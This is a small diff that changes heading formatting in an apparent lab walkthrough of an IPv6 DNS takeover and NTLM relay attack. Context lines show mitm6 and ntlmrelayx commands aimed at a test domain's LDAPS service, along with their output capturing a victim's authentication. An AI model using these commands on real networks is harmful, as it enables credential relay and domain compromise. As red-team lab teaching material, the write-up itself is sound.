@@ -92,7 +92,7 @@ sudo mitm6 -d readteambd.local -i eth0
 - DNS queries get redirected to my machine
 - WPAD and internal domain lookups are also redirected to me 
 
-## mitm6 output:
+**mitm6 output:**
 
 ```
 Starting mitm6 using the following configuration:
@@ -128,7 +128,7 @@ ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootm
 |-l lootme                      | Saves captured data to local folder         |
 ```
 
-## ntlmrelayx startup output:
+**ntlmrelayx startup output:**
 
 ```
 [*] Protocol Client SMB loaded..
@@ -172,7 +172,7 @@ After the reboot, Windows automatically started the authentication process:
 
 When the victim machine sends an authentication request, `ntlmrelayx` receives it and relays it to the Domain Controller’s LDAP service.
 
-Example output:
+**Output:**
 
 ```text
 [*] HTTPD(80): Connection from 192.168.5.135 controlled, attacking target ldaps://192.168.5.134
